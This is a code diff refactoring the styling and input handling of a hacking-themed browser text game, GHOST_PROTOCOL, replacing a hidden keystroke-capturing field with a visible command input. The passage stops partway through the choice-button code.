@@ -17,7 +17,7 @@
   --b1:rgba(0,255,136,0.10);--b2:rgba(0,255,136,0.25);
   --mono:'Share Tech Mono',monospace;--disp:'Orbitron',monospace;
 }
-html,body{height:100%;background:var(--bg);color:var(--text);font-family:var(--mono);overflow:hidden;cursor:crosshair;}
+html,body{height:100%;background:var(--bg);color:var(--text);font-family:var(--mono);overflow:hidden;}
 body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,136,0.012) 2px,rgba(0,255,136,0.012) 4px);pointer-events:none;z-index:9999;}
 body::after{content:'';position:fixed;inset:0;background:radial-gradient(ellipse at center,transparent 45%,rgba(0,0,0,0.82) 100%);pointer-events:none;z-index:9998;}
 #bg-canvas{position:fixed;inset:0;z-index:0;opacity:0.05;}
@@ -32,7 +32,7 @@ body::after{content:'';position:fixed;inset:0;background:radial-gradient(ellipse
 .logo-sub{font-family:var(--disp);font-size:clamp(8px,1.4vw,11px);letter-spacing:0.55em;color:var(--text2);margin-top:0.3rem;}
 @keyframes flk{0%,93%,95%,97%,100%{opacity:1;}94%,96%{opacity:0.4;}}
 .t-divider{width:90px;height:1px;background:var(--b2);margin:1.75rem 0;}
-.tagline{font-size:12px;color:var(--text2);letter-spacing:0.1em;text-align:center;line-height:2.1;margin-bottom:2rem;}
+.tagline{font-size:12px;color:var(--text2);letter-spacing:0.1em;text-align:center;line-height:2.2;margin-bottom:2rem;}
 .tagline b{color:var(--green);font-weight:normal;}
 .play-btn{font-family:var(--disp);font-size:12px;font-weight:700;letter-spacing:0.35em;background:transparent;border:1px solid var(--g2);color:var(--green);padding:15px 50px;cursor:pointer;transition:all 0.2s;box-shadow:0 0 18px rgba(0,255,136,0.1);}
 .play-btn:hover{background:rgba(0,255,136,0.07);box-shadow:0 0 32px rgba(0,255,136,0.22);}
@@ -42,42 +42,32 @@ body::after{content:'';position:fixed;inset:0;background:radial-gradient(ellipse
 #s-game{flex-direction:row;align-items:stretch;background:var(--bg);padding:0;}
 
 /* LEFT SIDEBAR */
-#sidebar{
-  width:200px;flex-shrink:0;
-  background:var(--bg3);
-  border-right:1px solid var(--b1);
-  display:flex;flex-direction:column;
-  z-index:2;
-}
-.sb-header{font-family:var(--disp);font-size:7px;letter-spacing:0.3em;color:var(--text3);padding:0.55rem 0.85rem;border-bottom:1px solid var(--b1);background:var(--bg2);text-transform:uppercase;}
-.sb-header span{color:var(--g2);}
+#sidebar{width:200px;flex-shrink:0;background:var(--bg3);border-right:1px solid var(--b1);display:flex;flex-direction:column;z-index:2;overflow:hidden;}
+.sb-hdr{font-family:var(--disp);font-size:7px;letter-spacing:0.3em;color:var(--text3);padding:0.55rem 0.85rem;border-bottom:1px solid var(--b1);background:var(--bg2);text-transform:uppercase;}
+.sb-hdr span{color:var(--g2);}
 
-/* mission nodes */
 #mission-nodes{padding:0.6rem;}
 .mnode{display:flex;align-items:center;gap:7px;padding:6px 7px;margin-bottom:2px;border:1px solid var(--b1);transition:all 0.3s;}
 .mnode.done{border-color:var(--gdim);background:var(--gfaint);}
 .mnode.active{border-color:var(--g2);background:rgba(0,255,136,0.04);box-shadow:0 0 8px rgba(0,255,136,0.07);}
 .mnode.locked{opacity:0.3;}
 .mnode-icon{font-size:11px;width:18px;flex-shrink:0;}
-.mnode-label{font-size:8px;letter-spacing:0.08em;color:var(--text2);}
-.mnode-label.a{color:var(--green);}
-.mnode-label.d{color:var(--g2);}
+.mnode-lbl{font-size:8px;letter-spacing:0.08em;color:var(--text2);}
+.mnode-lbl.a{color:var(--green);}
+.mnode-lbl.d{color:var(--g2);}
 .mnode-conn{width:1px;height:8px;background:var(--b2);margin:0 0 2px 16px;}
-.mnode-status{margin-left:auto;font-size:8px;}
+.mnode-st{margin-left:auto;font-size:8px;}
 
-/* stats */
 #sb-stats{padding:0.75rem;border-top:1px solid var(--b1);}
 .sb-stat{margin-bottom:9px;}
-.sb-stat-head{display:flex;justify-content:space-between;font-size:8px;letter-spacing:0.12em;color:var(--text2);margin-bottom:3px;text-transform:uppercase;}
-.sb-val{color:var(--green);}
-.sb-track{height:2px;background:var(--text3);}
+.sb-sh{display:flex;justify-content:space-between;font-size:8px;letter-spacing:0.12em;color:var(--text2);margin-bottom:3px;text-transform:uppercase;}
+.sb-v{color:var(--green);}
+.sb-trk{height:2px;background:var(--text3);}
 .sb-fill{height:100%;transition:width 0.5s ease;}
 .sb-fill.g{background:linear-gradient(90deg,var(--gdim),var(--green));}
 .sb-fill.a{background:linear-gradient(90deg,var(--adim),var(--amber));}
-.sb-fill.r{background:linear-gradient(90deg,var(--rdim),var(--red));}
 .sb-fill.c{background:linear-gradient(90deg,var(--cdim),var(--cyan));}
 
-/* IDS meter */
 #sb-ids{padding:0.75rem;border-top:1px solid var(--b1);margin-top:auto;}
 .ids-lbl{font-family:var(--disp);font-size:7px;letter-spacing:0.2em;color:var(--text3);margin-bottom:5px;text-transform:uppercase;}
 #ids-track{height:6px;background:var(--text3);overflow:hidden;}
@@ -86,21 +76,22 @@ body::after{content:'';position:fixed;inset:0;background:radial-gradient(ellipse
 
 /* ── CENTER TERMINAL ── */
 #terminal-wrap{flex:1;display:flex;flex-direction:column;overflow:hidden;position:relative;}
+
 #top-bar{display:flex;align-items:center;gap:0.8rem;background:rgba(4,11,15,0.95);border-bottom:1px solid var(--b1);padding:0 1rem;height:38px;flex-shrink:0;z-index:3;}
 #tb-logo{font-family:var(--disp);font-size:9px;font-weight:700;letter-spacing:0.3em;color:var(--green);text-shadow:0 0 8px rgba(0,255,136,0.4);}
 .tb-sep{color:var(--text3);font-size:10px;}
 #tb-loc{font-size:9px;color:var(--text2);letter-spacing:0.15em;}
 #tb-time{margin-left:auto;font-size:9px;color:var(--text2);}
-#tb-ids-badge{font-size:8px;letter-spacing:0.2em;padding:2px 9px;border:1px solid;text-transform:uppercase;transition:all 0.3s;}
-#tb-ids-badge.low{border-color:var(--gdim);color:var(--g2);}
-#tb-ids-badge.med{border-color:var(--adim);color:var(--amber);animation:bdg 1.5s ease infinite;}
-#tb-ids-badge.hi{border-color:var(--rdim);color:var(--red);animation:bdg 0.7s ease infinite;}
+#tb-badge{font-size:8px;letter-spacing:0.2em;padding:2px 9px;border:1px solid;text-transform:uppercase;transition:all 0.3s;}
+#tb-badge.low{border-color:var(--gdim);color:var(--g2);}
+#tb-badge.med{border-color:var(--adim);color:var(--amber);animation:bdg 1.5s ease infinite;}
+#tb-badge.hi{border-color:var(--rdim);color:var(--red);animation:bdg 0.7s ease infinite;}
 @keyframes bdg{0%,100%{opacity:1;}50%{opacity:0.4;}}
 
-/* terminal output */
-#term-out{flex:1;overflow-y:auto;padding:1rem 1.25rem;scroll-behavior:smooth;position:relative;z-index:1;}
+#term-out{flex:1;overflow-y:auto;padding:1rem 1.25rem;scroll-behavior:smooth;}
 #term-out::-webkit-scrollbar{width:2px;}
 #term-out::-webkit-scrollbar-thumb{background:var(--gdim);}
+
 .tl{line-height:1.85;font-size:12.5px;animation:tla 0.15s ease;}
 @keyframes tla{from{opacity:0;}to{opacity:1;}}
 .t-sys{color:var(--text3);font-size:11px;}
@@ -110,7 +101,7 @@ body::after{content:'';position:fixed;inset:0;background:radial-gradient(ellipse
 .t-story{color:var(--text2);font-size:13px;line-height:1.75;margin:0.2rem 0;}
 .t-npc{color:var(--cyan);font-size:12.5px;}
 .t-player{color:var(--green);font-size:12.5px;}
-.t-hdr{font-family:var(--disp);font-size:9px;letter-spacing:0.3em;color:var(--green);border-bottom:1px solid var(--b1);padding-bottom:4px;margin:0.85rem 0 0.35rem;text-shadow:0 0 8px rgba(0,255,136,0.25);}
+.t-hdr{font-family:var(--disp);font-size:9px;letter-spacing:0.3em;color:var(--green);border-bottom:1px solid var(--b1);padding-bottom:4px;margin:0.85rem 0 0.35rem;}
 .t-div{color:var(--text3);font-size:11px;margin:0.15rem 0;}
 
 /* ── BOTTOM BAR ── */
@@ -119,21 +110,29 @@ body::after{content:'';position:fixed;inset:0;background:radial-gradient(ellipse
 /* choices */
 #choices{display:none;flex-wrap:wrap;gap:5px;padding:0.6rem 1.25rem 0;}
 #choices.show{display:flex;}
-.choice{font-family:var(--mono);font-size:9px;letter-spacing:0.12em;background:transparent;border:1px solid var(--b2);color:var(--text2);padding:5px 12px;cursor:pointer;text-transform:uppercase;transition:all 0.15s;}
-.choice:hover{border-color:var(--green);color:var(--green);background:rgba(0,255,136,0.05);box-shadow:0 0 8px rgba(0,255,136,0.08);}
+.choice{font-family:var(--mono);font-size:9px;letter-spacing:0.12em;background:transparent;border:1px solid var(--b2);color:var(--text2);padding:6px 14px;cursor:pointer;text-transform:uppercase;transition:all 0.15s;}
+.choice:hover{border-color:var(--green);color:var(--green);background:rgba(0,255,136,0.05);}
 .choice.locked{border-color:var(--text3);color:var(--text3);cursor:default;}
-.choice .req{font-size:7px;color:var(--amber);margin-left:5px;}
 
-/* type row */
-#type-row{display:flex;align-items:center;padding:0.5rem 1.25rem 0.55rem;position:relative;cursor:text;}
-#pfx{font-size:12px;color:var(--g2);white-space:nowrap;padding-right:7px;flex-shrink:0;}
-#tdisp{flex:1;font-size:13px;min-height:18px;}
-#tdisp .cc{color:var(--green);}
-#tdisp .cw{color:var(--red);}
-#tdisp .cp{color:var(--text3);}
-#tdisp .cur{display:inline-block;width:7px;height:13px;background:var(--green);vertical-align:middle;animation:cur 0.8s step-end infinite;box-shadow:0 0 5px var(--green);}
-@keyframes cur{0%,100%{opacity:1;}50%{opacity:0;}}
-#real-input{position:absolute;opacity:0;width:100%;height:100%;top:0;left:0;background:transparent;border:none;outline:none;color:transparent;caret-color:transparent;font-size:13px;}
+/* THE ACTUAL INPUT — simple, visible, works everywhere */
+#input-section{padding:0.5rem 1.25rem 0.6rem;display:flex;align-items:center;gap:0.5rem;}
+#input-prefix{font-size:13px;color:var(--g2);white-space:nowrap;flex-shrink:0;}
+#cmd-input{
+  flex:1;
+  background:transparent;
+  border:none;
+  border-bottom:1px solid var(--g2);
+  outline:none;
+  color:var(--green);
+  font-family:var(--mono);
+  font-size:14px;
+  caret-color:var(--green);
+  padding:2px 4px;
+  letter-spacing:0.05em;
+}
+#cmd-input::placeholder{color:var(--text3);}
+#cmd-input:focus{border-bottom-color:var(--green);box-shadow:0 2px 8px -2px rgba(0,255,136,0.3);}
+#cmd-input:disabled{opacity:0.3;cursor:not-allowed;}
 
 #hint-bar{display:flex;align-items:center;padding:2px 1.25rem 0.5rem;border-top:1px solid var(--b1);}
 #hint-txt{font-size:8.5px;color:var(--text3);letter-spacing:0.12em;flex:1;}
@@ -153,14 +152,24 @@ body::after{content:'';position:fixed;inset:0;background:radial-gradient(ellipse
 .log-wn{color:var(--amber);}
 .log-er{color:var(--red);}
 
-/* ── MINI-GAME OVERLAY ── */
+/* ── MINI-GAME ── */
 #mg{display:none;position:fixed;inset:0;z-index:500;background:rgba(2,4,8,0.96);align-items:center;justify-content:center;flex-direction:column;gap:1.25rem;}
 #mg.show{display:flex;}
 #mg-title{font-family:var(--disp);font-size:11px;letter-spacing:0.4em;color:var(--green);text-shadow:0 0 18px rgba(0,255,136,0.5);}
-#mg-box{width:min(540px,92vw);background:var(--bg2);border:1px solid var(--b2);padding:1.4rem;box-shadow:0 0 35px rgba(0,255,136,0.07);}
+#mg-box{width:min(540px,92vw);background:var(--bg2);border:1px solid var(--b2);padding:1.4rem;}
 #mg-inst{font-size:11px;color:var(--text2);margin-bottom:0.85rem;line-height:1.7;}
 #mg-prompt{font-family:var(--mono);font-size:14px;letter-spacing:0.05em;line-height:2.1;margin-bottom:0.9rem;word-break:break-all;min-height:28px;}
-#mg-input{width:100%;background:rgba(0,0,0,0.5);border:1px solid var(--b2);color:var(--green);font-family:var(--mono);font-size:13px;padding:8px 12px;outline:none;caret-color:var(--green);transition:border-color 0.2s;}
+#mg-input{
+  width:100%;
+  background:rgba(0,0,0,0.5);
+  border:1px solid var(--b2);
+  color:var(--green);
+  font-family:var(--mono);
+  font-size:13px;
+  padding:9px 12px;
+  outline:none;
+  caret-color:var(--green);
+}
 #mg-input:focus{border-color:var(--g2);}
 #mg-input.err{border-color:var(--red);}
 #mg-input.ok2{border-color:var(--green);box-shadow:0 0 8px rgba(0,255,136,0.2);}
@@ -168,18 +177,18 @@ body::after{content:'';position:fixed;inset:0;background:radial-gradient(ellipse
 #mg-pbar{width:160px;height:2px;background:var(--text3);}
 #mg-pfill{height:100%;background:var(--green);transition:width 0.3s;}
 #mg-timer{font-size:10px;color:var(--amber);}
-#mg-wpm{font-size:10px;color:var(--text2);}
+#mg-wpm-txt{font-size:10px;color:var(--text2);}
 
 /* ── NOTIFS ── */
 #notifs{position:fixed;top:46px;right:185px;z-index:400;display:flex;flex-direction:column;gap:5px;pointer-events:none;}
-.notif{font-family:var(--mono);font-size:9px;letter-spacing:0.15em;text-transform:uppercase;padding:5px 11px;border-left:2px solid;animation:nsl 0.3s ease;max-width:240px;}
+.notif{font-family:var(--mono);font-size:9px;letter-spacing:0.15em;text-transform:uppercase;padding:5px 11px;border-left:2px solid;animation:nsl 0.3s ease;}
 .notif.ok{background:rgba(0,255,136,0.05);border-color:var(--green);color:var(--green);}
 .notif.bad{background:rgba(255,34,68,0.05);border-color:var(--red);color:var(--red);}
 .notif.info{background:rgba(0,229,255,0.05);border-color:var(--cyan);color:var(--cyan);}
 .notif.warn{background:rgba(255,170,0,0.05);border-color:var(--amber);color:var(--amber);}
 @keyframes nsl{from{opacity:0;transform:translateX(8px);}to{opacity:1;}}
 
-/* ── END SCREEN ── */
+/* ── END ── */
 #s-end{background:rgba(2,4,8,0.98);}
 .end-title{font-family:var(--disp);font-size:clamp(28px,6vw,56px);font-weight:900;letter-spacing:0.1em;margin-bottom:0.4rem;}
 .end-title.win{color:var(--green);text-shadow:0 0 28px rgba(0,255,136,0.4);}
@@ -189,9 +198,7 @@ body::after{content:'';position:fixed;inset:0;background:radial-gradient(ellipse
 .end-stat{background:var(--bg2);border:1px solid var(--b1);padding:0.7rem;text-align:center;}
 .end-stat-l{font-size:7px;letter-spacing:0.2em;color:var(--text3);margin-bottom:4px;text-transform:uppercase;}
 .end-stat-v{font-size:19px;color:var(--green);}
-.end-btns{display:flex;gap:10px;}
 
-/* responsive */
 @media(max-width:700px){#sidebar,#log-panel{display:none;}#s-game{flex-direction:column;}}
 </style>
 </head>
@@ -210,23 +217,22 @@ body::after{content:'';position:fixed;inset:0;background:radial-gradient(ellipse
 
 <!-- GAME -->
 <div class="screen hide" id="s-game">
-  <!-- SIDEBAR -->
   <div id="sidebar">
-    <div class="sb-header">MISSION MAP <span>// OP</span></div>
+    <div class="sb-hdr">MISSION MAP <span>// OP</span></div>
     <div id="mission-nodes"></div>
     <div id="sb-stats">
-      <div class="sb-header" style="margin:-1px -0.85rem 0.7rem;padding:0.55rem 0.85rem;">OPERATOR</div>
+      <div class="sb-hdr" style="margin:-1px -0.85rem 0.7rem;padding:0.55rem 0.85rem;">OPERATOR</div>
       <div class="sb-stat">
-        <div class="sb-stat-head"><span>STEALTH</span><span class="sb-val" id="sv-s">85</span></div>
-        <div class="sb-track"><div class="sb-fill g" id="sf-s" style="width:85%"></div></div>
+        <div class="sb-sh"><span>STEALTH</span><span class="sb-v" id="sv-s">85</span></div>
+        <div class="sb-trk"><div class="sb-fill g" id="sf-s" style="width:85%"></div></div>
       </div>
       <div class="sb-stat">
-        <div class="sb-stat-head"><span>HACKING</span><span class="sb-val" id="sv-h">70</span></div>
-        <div class="sb-track"><div class="sb-fill c" id="sf-h" style="width:70%"></div></div>
+        <div class="sb-sh"><span>HACKING</span><span class="sb-v" id="sv-h">70</span></div>
+        <div class="sb-trk"><div class="sb-fill c" id="sf-h" style="width:70%"></div></div>
       </div>
       <div class="sb-stat">
-        <div class="sb-stat-head"><span>SOCIAL</span><span class="sb-val" id="sv-o">55</span></div>
-        <div class="sb-track"><div class="sb-fill a" id="sf-o" style="width:55%"></div></div>
+        <div class="sb-sh"><span>SOCIAL</span><span class="sb-v" id="sv-o">55</span></div>
+        <div class="sb-trk"><div class="sb-fill a" id="sf-o" style="width:55%"></div></div>
       </div>
     </div>
     <div id="sb-ids">
@@ -236,22 +242,28 @@ body::after{content:'';position:fixed;inset:0;background:radial-gradient(ellipse
     </div>
   </div>
 
-  <!-- TERMINAL -->
   <div id="terminal-wrap">
     <div id="top-bar">
       <div id="tb-logo">GHOST_PROTOCOL</div>
       <div class="tb-sep">//</div>
       <div id="tb-loc">INITIALIZING...</div>
-      <div id="tb-ids-badge" class="low">THREAT: LOW</div>
+      <div id="tb-badge" class="low">THREAT: LOW</div>
       <div id="tb-time">00:00</div>
     </div>
     <div id="term-out"></div>
     <div id="bottom-bar">
       <div id="choices"></div>
-      <div id="type-row">
-        <div id="pfx">ghost@op:~$&nbsp;</div>
-        <div id="tdisp"><span class="cur"></span></div>
-        <input id="real-input" type="text" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"/>
+      <div id="input-section">
+        <div id="input-prefix">ghost@op:~$</div>
+        <input
+          id="cmd-input"
+          type="text"
+          autocomplete="off"
+          autocorrect="off"
+          autocapitalize="off"
+          spellcheck="false"
+          placeholder="type command here and press Enter..."
+        />
       </div>
       <div id="hint-bar">
         <div id="hint-txt">AWAITING INPUT</div>
@@ -260,9 +272,8 @@ body::after{content:'';position:fixed;inset:0;background:radial-gradient(ellipse
     </div>
   </div>
 
-  <!-- LOG -->
   <div id="log-panel">
-    <div class="sb-header">ACTIVITY <span>// LOG</span></div>
+    <div class="sb-hdr">ACTIVITY <span>// LOG</span></div>
     <div id="log-out"></div>
   </div>
 </div>
@@ -273,11 +284,11 @@ body::after{content:'';position:fixed;inset:0;background:radial-gradient(ellipse
   <div id="mg-box">
     <div id="mg-inst"></div>
     <div id="mg-prompt"></div>
-    <input id="mg-input" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" placeholder="Type here..."/>
+    <input id="mg-input" type="text" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" placeholder="Type here..."/>
     <div id="mg-meta">
       <div><div id="mg-pbar"><div id="mg-pfill" style="width:0%"></div></div></div>
       <div id="mg-timer">—</div>
-      <div id="mg-wpm">WPM: —</div>
+      <div id="mg-wpm-txt">WPM: —</div>
     </div>
   </div>
 </div>
@@ -294,13 +305,11 @@ body::after{content:'';position:fixed;inset:0;background:radial-gradient(ellipse
     <div class="end-stat"><div class="end-stat-l">IDS Peak</div><div class="end-stat-v" id="e-ids">—</div></div>
     <div class="end-stat"><div class="end-stat-l">Stealth</div><div class="end-stat-v" id="e-st">—</div></div>
   </div>
-  <div class="end-btns">
-    <button class="play-btn" onclick="location.reload()">REDEPLOY</button>
-  </div>
+  <button class="play-btn" onclick="location.reload()">REDEPLOY</button>
 </div>
 
 <script>
-// ── MATRIX RAIN ──
+/* ── MATRIX RAIN ── */
 (()=>{
   const c=document.getElementById('bg-canvas');
   const r=()=>{c.width=innerWidth;c.height=innerHeight;};r();addEventListener('resize',r);
@@ -317,30 +326,31 @@ body::after{content:'';position:fixed;inset:0;background:radial-gradient(ellipse
   },55);
 })();
 
-// ── STATE ──
+/* ── STATE ── */
 const G={
   stats:{s:85,h:70,o:55},ids:5,
-  scene:null,typing:{kw:'',typed:''},
+  scene:null,
+  expectedCmd:'',
   mg:{active:false},
-  wpm:{chars:0,start:null},
+  wpmStart:null,wpmChars:0,
   start:Date.now(),peakIds:5,
 };
 
-// ── NODES ──
+/* ── MISSION NODES ── */
 const NODES=[
-  {id:'recon',  label:'RECON',        icon:'📡',st:'done'},
-  {id:'vpn',    label:'VPN TUNNEL',   icon:'🔒',st:'active'},
-  {id:'breach', label:'BREACH',       icon:'🛡',st:'locked'},
-  {id:'vault',  label:'BLACKVAULT',   icon:'💾',st:'locked'},
-  {id:'exfil',  label:'EXFIL',        icon:'🚁',st:'locked'},
+  {id:'recon', label:'RECON',      icon:'📡',st:'done'},
+  {id:'vpn',   label:'VPN TUNNEL', icon:'🔒',st:'active'},
+  {id:'breach',label:'BREACH',     icon:'🛡',st:'locked'},
+  {id:'vault', label:'BLACKVAULT', icon:'💾',st:'locked'},
+  {id:'exfil', label:'EXFIL',      icon:'🚁',st:'locked'},
 ];
 function renderNodes(){
   document.getElementById('mission-nodes').innerHTML=NODES.map((n,i)=>`
     ${i>0?'<div class="mnode-conn"></div>':''}
     <div class="mnode ${n.st}">
       <div class="mnode-icon">${n.icon}</div>
-      <div class="mnode-label ${n.st==='done'?'d':n.st==='active'?'a':''}">${n.label}</div>
-      <div class="mnode-status" style="color:${n.st==='done'?'var(--g2)':n.st==='active'?'var(--amber)':'var(--text3)'}">${n.st==='done'?'✓':n.st==='active'?'▶':'—'}</div>
+      <div class="mnode-lbl ${n.st==='done'?'d':n.st==='active'?'a':''}">${n.label}</div>
+      <div class="mnode-st" style="color:${n.st==='done'?'var(--g2)':n.st==='active'?'var(--amber)':'var(--text3)'}">${n.st==='done'?'✓':n.st==='active'?'▶':'—'}</div>
     </div>`).join('');
 }
 function activateNode(id){
@@ -349,215 +359,249 @@ function activateNode(id){
   n.st='active';renderNodes();
 }
 
-// ── TERMINAL ──
+/* ── TERMINAL ── */
 let tQ=[];let tB=false;
-function tp(text,cls='t-story',delay=0){tQ.push({text,cls,delay});if(!tB)pQ();}
+function tp(text,cls,delay){
+  cls=cls||'t-story';delay=delay||0;
+  tQ.push({text,cls,delay});if(!tB)pQ();
+}
 function pQ(){
   if(!tQ.length){tB=false;return;}tB=true;
-  const {text,cls,delay}=tQ.shift();
+  const item=tQ.shift();
   setTimeout(()=>{
     const out=document.getElementById('term-out');
-    const el=document.createElement('div');el.className='tl '+cls;out.appendChild(el);out.scrollTop=out.scrollHeight;
-    if(cls==='t-story'||cls==='t-npc'||cls==='t-player'){
-      let i=0;const iv=setInterval(()=>{el.textContent=text.slice(0,i+1);i++;out.scrollTop=out.scrollHeight;if(i>=text.length){clearInterval(iv);setTimeout(pQ,65);}},15);
-    } else {el.textContent=text;pQ();}
-  },delay);
+    const el=document.createElement('div');el.className='tl '+item.cls;
+    out.appendChild(el);out.scrollTop=out.scrollHeight;
+    if(item.cls==='t-story'||item.cls==='t-npc'||item.cls==='t-player'){
+      let i=0;
+      const iv=setInterval(()=>{
+        el.textContent=item.text.slice(0,i+1);i++;
+        out.scrollTop=out.scrollHeight;
+        if(i>=item.text.length){clearInterval(iv);setTimeout(pQ,60);}
+      },14);
+    } else {el.textContent=item.text;pQ();}
+  },item.delay);
 }
-const tSys=t=>tp(t,'t-sys');
-const tOK=t=>tp(t,'t-ok');
-const tErr=t=>tp(t,'t-err');
-const tWarn=t=>tp(t,'t-warn');
-const tNPC=(n,t)=>tp(`[${n}] ${t}`,'t-npc',45);
-const tYOU=t=>tp(`> ${t}`,'t-player');
-const tHdr=t=>tp(t,'t-hdr');
-const tDiv=()=>tp('─'.repeat(46),'t-div');
-const tBlank=()=>tp('','t-sys');
+function tSys(t){tp(t,'t-sys');}
+function tOK(t){tp(t,'t-ok');}
+function tErr(t){tp(t,'t-err');}
+function tWarn(t){tp(t,'t-warn');}
+function tNPC(n,t){tp('['+n+'] '+t,'t-npc',40);}
+function tYOU(t){tp('> '+t,'t-player');}
+function tHdr(t){tp(t,'t-hdr');}
+function tDiv(){tp('─'.repeat(46),'t-div');}
+function tBlank(){tp('','t-sys');}
 
-// ── LOG ──
-function log(msg,type='log-m'){
-  const now=new Date(),ts=`${String(now.getHours()).padStart(2,'0')}:${String(now.getMinutes()).padStart(2,'0')}:${String(now.getSeconds()).padStart(2,'0')}`;
+/* ── LOG ── */
+function log(msg,type){
+  type=type||'log-m';
+  const now=new Date();
+  const ts=String(now.getHours()).padStart(2,'0')+':'+String(now.getMinutes()).padStart(2,'0')+':'+String(now.getSeconds()).padStart(2,'0');
   const el=document.createElement('div');el.className='log-e';
-  el.innerHTML=`<span class="log-t">[${ts}]</span> <span class="${type}">${msg}</span>`;
+  el.innerHTML='<span class="log-t">['+ts+']</span> <span class="'+type+'">'+msg+'</span>';
   const lo=document.getElementById('log-out');lo.appendChild(el);lo.scrollTop=lo.scrollHeight;
 }
 
-// ── STATS ──
+/* ── STATS ── */
 function setStat(k,v){
   v=Math.max(0,Math.min(100,v));G.stats[k]=v;
-  const sv=document.getElementById('sv-'+k),sf=document.getElementById('sf-'+k);
+  const sv=document.getElementById('sv-'+k);
+  const sf=document.getElementById('sf-'+k);
   if(sv)sv.textContent=v;if(sf)sf.style.width=v+'%';
 }
 function setIDS(v){
   v=Math.max(0,Math.min(100,v));G.ids=v;if(v>G.peakIds)G.peakIds=v;
-  const f=document.getElementById('ids-fill'),p=document.getElementById('ids-pct');
-  f.style.width=v+'%';p.textContent=v+'%';
-  f.style.background=v<40?'var(--green)':v<70?'var(--amber)':'var(--red)';
-  p.style.color=v<40?'var(--green)':v<70?'var(--amber)':'var(--red)';
-  const b=document.getElementById('tb-ids-badge');
+  document.getElementById('ids-fill').style.width=v+'%';
+  document.getElementById('ids-pct').textContent=v+'%';
+  document.getElementById('ids-fill').style.background=v<40?'var(--green)':v<70?'var(--amber)':'var(--red)';
+  document.getElementById('ids-pct').style.color=v<40?'var(--green)':v<70?'var(--amber)':'var(--red)';
+  const b=document.getElementById('tb-badge');
   if(v<30){b.textContent='THREAT: LOW';b.className='low';}
   else if(v<65){b.textContent='THREAT: MED';b.className='med';}
   else{b.textContent='THREAT: HIGH';b.className='hi';}
-  b.id='tb-ids-badge';
 }
 function setLoc(t){document.getElementById('tb-loc').textContent=t;}
 
-// ── NOTIFY ──
-function notify(msg,type='info'){
-  const el=document.createElement('div');el.className=`notif ${type}`;el.textContent=msg;
+/* ── NOTIFY ── */
+function notify(msg,type){
+  type=type||'info';
+  const el=document.createElement('div');el.className='notif '+type;el.textContent=msg;
   document.getElementById('notifs').appendChild(el);
   log(msg,type==='ok'?'log-ok':type==='bad'||type==='warn'?'log-wn':'log-m');
   setTimeout(()=>el.remove(),3200);
 }
 
-// ── CLOCK ──
+/* ── CLOCK ── */
 setInterval(()=>{
   const e=Math.floor((Date.now()-G.start)/1000);
-  const m=String(Math.floor(e/60)).padStart(2,'0'),s=String(e%60).padStart(2,'0');
-  document.getElementById('tb-time').textContent=`${m}:${s}`;
+  const m=String(Math.floor(e/60)).padStart(2,'0');
+  const s=String(e%60).padStart(2,'0');
+  document.getElementById('tb-time').textContent=m+':'+s;
 },1000);
 
-// ── TYPING ──
-const ri=document.getElementById('real-input');
+/* ══════════════════════════════════════════
+   INPUT — simple visible text field
+   Player types command + presses Enter
+══════════════════════════════════════════ */
+const cmdInput=document.getElementById('cmd-input');
 
-// Focus real-input on any click or keydown anywhere in the game
-document.addEventListener('click',()=>{if(!G.mg.active)ri.focus();});
-document.addEventListener('keydown',(e)=>{
-  if(G.mg.active)return;
-  if(document.getElementById('s-game').classList.contains('hide'))return;
-  // Don't steal from visible inputs
-  if(document.activeElement===document.getElementById('mg-input'))return;
-  // Redirect all printable keypresses to the hidden input
-  if(e.key.length===1&&!e.ctrlKey&&!e.metaKey&&!e.altKey){
-    ri.focus();
-    // Manually append the character since focus alone won't capture it
-    const cur=ri.value;
-    ri.value=cur+e.key;
+cmdInput.addEventListener('keydown',function(e){
+  if(e.key==='Enter'){
     e.preventDefault();
-    // Trigger input handler manually
-    ri.dispatchEvent(new Event('input'));
-  } else if(e.key==='Backspace'){
-    ri.focus();
-    ri.value=ri.value.slice(0,-1);
-    e.preventDefault();
-    ri.dispatchEvent(new Event('input'));
+    const val=cmdInput.value.trim().toLowerCase();
+    if(!val)return;
+    tYOU(val);
+    cmdInput.value='';
+
+    // WPM tracking
+    if(!G.wpmStart)G.wpmStart=Date.now();
+    G.wpmChars+=(val.length+1);
+    const mins=(Date.now()-G.wpmStart)/60000;
+    if(mins>0.01)document.getElementById('wpm-val').textContent=Math.round((G.wpmChars/5)/mins);
+
+    processCommand(val);
   }
 });
-ri.addEventListener('input',handleType);
 
-function setKW(kw,hint){
-  G.typing={kw:kw.toLowerCase(),typed:''};
-  const h=document.getElementById('hint-txt');
-  h.innerHTML=hint?`CMD: <span>${hint}</span>`:'AWAITING INPUT';
-  renderTD('');ri.value='';ri.focus();
-}
-
-function renderTD(typed){
-  const kw=G.typing.kw,d=document.getElementById('tdisp');
-  if(!kw){d.innerHTML='<span class="cur"></span>';return;}
-  let h='';
-  for(let i=0;i<kw.length;i++){
-    if(i<typed.length)h+=typed[i]===kw[i]?`<span class="cc">${kw[i]}</span>`:`<span class="cw">${kw[i]}</span>`;
-    else{if(i===typed.length)h+='<span class="cur"></span>';h+=`<span class="cp">${kw[i]}</span>`;}
-  }
-  if(typed.length>=kw.length)h+='<span class="cur"></span>';
-  d.innerHTML=h;
-}
-
-function handleType(){
-  if(G.mg.active)return;
-  const raw=ri.value.toLowerCase();ri.value='';
-  if(!G.typing.kw)return;
-  if(raw.length>G.typing.kw.length){return;}
-  G.typing.typed=raw;renderTD(raw);
-  if(!G.wpm.start&&raw.length>0)G.wpm.start=Date.now();
-  G.wpm.chars=raw.length;
-  if(G.wpm.start){
-    const mins=(Date.now()-G.wpm.start)/60000;
-    if(mins>0.01)document.getElementById('wpm-val').textContent=Math.round((G.wpm.chars/5)/mins);
-  }
-  if(raw===G.typing.kw){
-    G.wpm={chars:0,start:null};document.getElementById('wpm-val').textContent='—';
-    tYOU(raw);tBlank();
-    hideChoices();
-    onCMD(raw);
-  }
-}
-
-// ── CHOICES ──
+/* ── CHOICES (click buttons) ── */
 function showChoices(arr){
   const el=document.getElementById('choices');el.innerHTML='';
-  arr.forEach(c=>{
-    const btn=document.createElement('button');btn.className='choice'+(c.locked?' locked':'');
-    btn.innerHTML=`${c.label}${c.locked?`<span class="req">[${c.req}]</span>`:''}`;
